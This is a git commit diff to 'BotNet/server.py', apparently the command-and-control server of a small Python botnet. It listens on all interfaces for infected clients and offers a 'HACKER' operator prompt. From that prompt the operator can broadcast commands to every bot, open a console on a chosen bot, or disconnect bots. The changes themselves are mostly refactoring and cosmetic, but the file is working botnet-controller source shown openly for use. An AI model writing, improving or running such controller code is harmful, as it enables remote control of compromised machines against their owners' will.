52cd6419282a61c65bf618a20a733cd87240afe0
Kr0dÿ <91196264+Retr0Kr0dy@users.noreply.github.com>
2022-06-15 11:05:55 +0200

    Update server.py

--- BotNet/server.py
+++ BotNet/server.py
@@ -1,4 +1,3 @@
-from pydoc import cli
 import threading, socket, sys
 
 
@@ -8,11 +7,12 @@ R = '\033[31m' #red
 G = '\033[32m' #green
 O = '\033[33m' #orange
 B = '\033[34m' #blue
-P = '\033[35m' #purple
+P = '\033[1;35m' #purple
+Pp = '\033[35m' #light purple
 C = '\033[36m' #cyan
 GR = '\033[37m' #grey
 
-help=G+ """
+help=G+"""
 
   Commands;
     
@@ -28,9 +28,9 @@ help=G+ """
 try:
     host=sys.argv[1]
 except:
-    host = input (B+"\nEnter the IP of the host server (or leave empty for localhost) : "+W)
+    host = input (B+"\nEnter the IP of the host server (or leave empty for 0.0.0.0) : "+W)
     if len(host) == 0:
-        host = '127.0.0.1' 
+        host = '0.0.0.0' 
 
 try:
     port=int(sys.argv[2])
@@ -49,10 +49,10 @@ con = ''
 def listen():
     while True:
         client, address = server.accept()
-        print (B+"\nNew user connected at "+G+str(address)+'\n'+W)
+        print (C+"\n\n    New user connected at "+G+str(address)+'\n'+W)
         clients_list.append(client)
         address_list.append(address)
-        print (clients_list)
+        print ("",client)
 
 thread = threading.Thread(target=listen)
 thread.start()
@@ -77,8 +77,9 @@ def console(client):
 def broadcast(message):
     for client in clients_list:
         index=clients_list.index(client)
-        print(B+"\n    ["+P+str(index)+B+"]"+O+" - "+G+"AA"+O+" - "+P+str(client)+"\n")
+        print(B+"\n    ["+P+str(index)+B+"]"+O+" - "+G+"AA"+O+" - "+P+str(client))
         client.send(message)
+    print("")
 
 def brdcst():
     a = input(P+"HACKER"+B+"_"+O+"@"+B+"_"+P+"NODE1"+B+"_"+P+"FROM"+B+"_"+P+host+B+"#"+P+"¬"+W) 
@@ -91,13 +92,18 @@ def brdcst():
         try:
             for client in clients_list:
                 print (B+"\n    ["+P+str(clients_list.index(client))+B+"] - "+P+str(address_list[clients_list.index(client)])+W)
-            client = clients_list[int(input(B+"\n  client index :"+W))] 
+            inp = input(B+"\n  client index : "+W)
+            client = clients_list[int(inp)]
+            print("\n   ",client) 
         except:
-            print(R+"NOTHING"+W)
+            if "QUIT" in inp:
+                print(R+"\n  Returning to previous menu...\n"+W)
+                main()
+            print(R+"\n  - -Error- -"+W)
             brdcst()
         print()
         client.send(a)
-        print (R+"\nDisconnected at "+G+str(address_list[clients_list.index(client)])+'\n'+W)
+        print (R+"\n    Disconnected at "+G+str(address_list[clients_list.index(client)])+'\n'+W)
         clients_list.remove(client)
         main()
     if len(a) == 0:
@@ -106,8 +112,24 @@ def brdcst():
     broadcast(a)
     brdcst()
 
+def console_handle():
+    try:
+        for client in clients_list:
+            print (B+"\n    ["+P+str(clients_list.index(client))+B+"] - "+P+str(address_list[clients_list.index(client)])+W)
+        inp = input(B+"\n  client index : "+W)
+        client = clients_list[int(inp)]
+        print(client) 
+    except:
+        if "QUIT" in inp:
+            print(R+"\n  Returning to previous menu...\n"+W)
+            main()
+        print(R+"\n  - -Error- -"+W)
+        console_handle()
+    print (C+"\n    Connected at "+G+str(address_list[clients_list.index(client)])+'\n'+W)
+    console(client)
+
 def reciv(client):
-    message = client.recv(2048)
+    message = client.recv(4096)
     message = message.decode()
     print (message)
 
@@ -116,18 +138,10 @@ def main():
         a = input(P+"HACKER"+B+"_"+O+"@"+B+"_"+P+host+B+"#"+P+"¬"+W) 
         if "QUIT" in a:
             print (R+"\nQUITTING...")
-            break
+            server.close()
+            exit(-1)
         if "CONSOLE" in a:
-            def ask():
-                try:
-                    for client in clients_list:
-                        print (B+"\n    ["+P+str(clients_list.index(client))+B+"] - "+P+str(address_list[clients_list.index(client)])+W)
-                    client = clients_list[int(input(B+"\n  client index :"+W))] 
-                except:
-                    ask()
-            ask()
-            print()
-            console(client)
+            console_handle()
         if "CLIENT" in a:
             print (B+"\nCLIENT_LIST\n")
             for client in clients_list:
@@ -136,24 +150,27 @@ def main():
             brdcst()
         if a == 'DISCONNECT':
             a = bytearray(a.encode('utf-8'))
-            def ask():
-                try:
-                    for client in clients_list:
-                        print (B+"\n    ["+P+str(clients_list.index(client))+B+"] - "+P+str(address_list[clients_list.index(client)])+W)
-                    client = clients_list[int(input(B+"\n  client index :"+W))] 
-                except:
-                    ask()
-            ask()
-            print()     
+            try:
+                for client in clients_list:
+                    print (B+"\n    ["+P+str(clients_list.index(client))+B+"] - "+P+str(address_list[clients_list.index(client)])+W)
+                inp = input(B+"\n  client index : "+W)
+                client = clients_list[int(inp)]
+                print("\n   ",client) 
+            except:
+                if "QUIT" in inp:
+                    print(R+"\n  Returning to previous menu...\n"+W)
+                    main()
+                print(R+"\n  - -Error- -"+W)
+                brdcst()
             client.send(a)
-            print (R+"\nDisconnected at "+G+str(address_list[clients_list.index(client)])+'\n'+W)
+            print (R+"\n    Disconnected at "+G+str(address_list[clients_list.index(client)])+'\n'+W)
             clients_list.remove(client)
             main()
         if 'DISCONNECT_ALL' in a:
             a = bytearray('DISCONNECT'.encode('utf-8'))
             for client in clients_list:
                 client.send(a)
-                print (R+"\nDisconnected at "+G+str(address_list[clients_list.index(client)])+'\n'+W)
+                print (R+"\n    Disconnected at "+G+str(address_list[clients_list.index(client)])+'\n'+W)
                 clients_list.remove(client)
             main()      
         if len(a) == 0:
@@ -172,4 +189,4 @@ print (B+'\nServer is running on '+O+host+B+' using port '+O+str(port)+B+'...\n'
 main()
 
 
-#version 1.3
+#version 1.5
